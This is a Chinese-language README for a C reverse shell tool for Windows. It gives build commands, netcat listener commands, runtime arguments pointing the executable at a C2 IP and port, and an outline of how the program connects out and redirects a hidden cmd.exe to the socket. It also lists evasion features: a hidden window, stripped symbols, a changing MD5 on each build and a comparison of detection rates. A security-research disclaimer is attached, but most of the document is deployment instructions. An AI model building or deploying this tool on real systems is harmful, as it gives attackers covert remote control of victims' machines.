# ReverseShell (C)

> ⚠️ **仅供安全研究和教育目的使用，请在隔离环境中测试**

这是一个使用 C 语言实现的基础反向 Shell 程序，用于安全研究和测试。

## 快速开始

```bash
# 1. 安装 mingw-w64 (macOS)
brew install mingw-w64

# 2. 编译
./build.sh

# 3. 启动监听
nc -lvnp 4444

# 4. 在 Windows 靶机执行
reverse_shell_win64.exe [C2_IP] [PORT]
```

## 功能特性

- 基础反向 Shell 连接
- 支持命令行参数指定 C2 地址和端口
- 隐藏窗口运行
- 体积小（约 10-20KB）

## 编译

### 环境要求

- macOS/Linux: mingw-w64 交叉编译器
- Windows: MinGW 或 Visual Studio

### macOS 安装 mingw-w64

```bash
brew install mingw-w64
```

### Ubuntu/Debian 安装 mingw-w64

```bash
sudo apt install mingw-w64
```

### 交叉编译（macOS/Linux → Windows）

```bash
# 使用编译脚本（推荐）
./build.sh

# 或手动编译 64 位
x86_64-w64-mingw32-gcc main.c -o bin/reverse_shell_win64.exe -lws2_32 -mwindows -s

# 或手动编译 32 位
i686-w64-mingw32-gcc main.c -o bin/reverse_shell_win32.exe -lws2_32 -mwindows -s
```

### 在 Windows 上编译

```cmd
# 使用 MinGW
gcc main.c -o reverse_shell.exe -lws2_32 -mwindows -s

# 使用 Visual Studio (Developer Command Prompt)
cl main.c /Fe:reverse_shell.exe ws2_32.lib /link /SUBSYSTEM:WINDOWS
```

### 编译参数说明

| 参数 | 作用 |
|------|------|
| `-lws2_32` | 链接 Winsock 库 |
| `-mwindows` | 创建 GUI 程序（无控制台窗口） |
| `-s` | 去除符号表（减小体积） |

## 使用方法

### 修改默认 C2 地址

编辑 `main.c` 中的宏定义：

```c
#define C2_HOST "YOUR_IP"
#define C2_PORT 4444
```

### 运行时指定 C2 地址

```cmd
# 默认连接 127.0.0.1:4444
reverse_shell_win64.exe

# 指定 IP
reverse_shell_win64.exe 192.168.1.100

# 指定 IP 和端口
reverse_shell_win64.exe 192.168.1.100 8888
```

### 启动监听器

```bash
# Linux/macOS
nc -lvnp 4444

# 或使用 rlwrap 增强交互
rlwrap nc -lvnp 4444
```

## 项目结构

```sh
C/ReverseShell/
├── main.c           # 主程序源码
├── build.sh         # 编译脚本（每次生成不同MD5）
├── README.md        # 说明文档
└── bin/
    ├── reverse_shell_win64.exe  # 64位版本
    └── reverse_shell_win32.exe  # 32位版本
```

## 与其他版本对比

| 特性 | C 版本 | Go 版本 | PowerShell 版本 |
|------|--------|---------|-----------------|
| 文件大小 | ~15KB | ~2MB | 无文件 |
| 依赖 | 无 | 无 | PowerShell |
| 检测率 | 中 | 低 | 高 |
| 可扩展性 | 需手动 | 简单 | 简单 |
| 跨平台编译 | 需mingw | 原生支持 | 仅Windows |

## 技术细节

### 核心 API

```c
// 网络连接
WSASocket()      // 创建 socket
WSAConnect()     // 连接到 C2

// 进程创建
CreateProcess()  // 创建 cmd.exe
STARTF_USESTDHANDLES  // 重定向 IO 到 socket
```

### 工作原理

1. 初始化 Winsock
2. 创建 TCP socket
3. 连接到 C2 服务器
4. 创建 cmd.exe 进程
5. 将 stdin/stdout/stderr 重定向到 socket
6. 等待进程结束

## 免责声明

本项目仅供以下用途：

- 安全研究和学习
- 渗透测试（需授权）
- 恶意软件分析培训

**严禁用于任何非法目的。使用者需自行承担法律责任。**
